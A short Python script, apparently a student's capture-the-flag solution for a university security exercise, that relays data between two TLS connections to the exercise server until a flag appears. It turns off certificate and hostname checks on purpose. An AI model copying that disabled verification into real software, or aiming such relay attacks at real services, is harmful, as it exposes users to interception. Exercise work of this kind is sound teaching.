import socket
import ssl

#who are we gonna atack?
HOST = 'weird.exercise.itsec.ias.tu-bs.de'
PORT = 3333

context = ssl.create_default_context()

#we need to make sure that the validation of the certificate is not real for the exercise
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

#to connect twice
def connect_to_service():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection = context.wrap_socket(sock, server_hostname=HOST)
    return connection

try:
    print("Initializing connection 1...")
    connection1 = connect_to_service()
    connection1.connect((HOST, PORT))

    print("Initializing connection 2...")
    connection2 = connect_to_service()
    connection2.connect((HOST, PORT))

    print("connections established")

    while True:
        #we receive from connection1
        data1= connection1.recv(4096)
        if not data1:
            break
        print(f"[1 -> ?] {data1!r}")
        connection2.sendall(data1)

        #receive from connection 2
        data2= connection2.recv(4096)
        if not data2:
            break
        print(f"[2 -> ?] {data2!r}")
        connection1.sendall(data2)

        #check for flag
        text = data1.decode(errors='ignore') + data2.decode(errors='ignore')
        if "flag" in text.lower():
            print("Flag")
            print(text)
            break
    connection1.close()
    connection2.close()

except Exception as e:
    print(e)

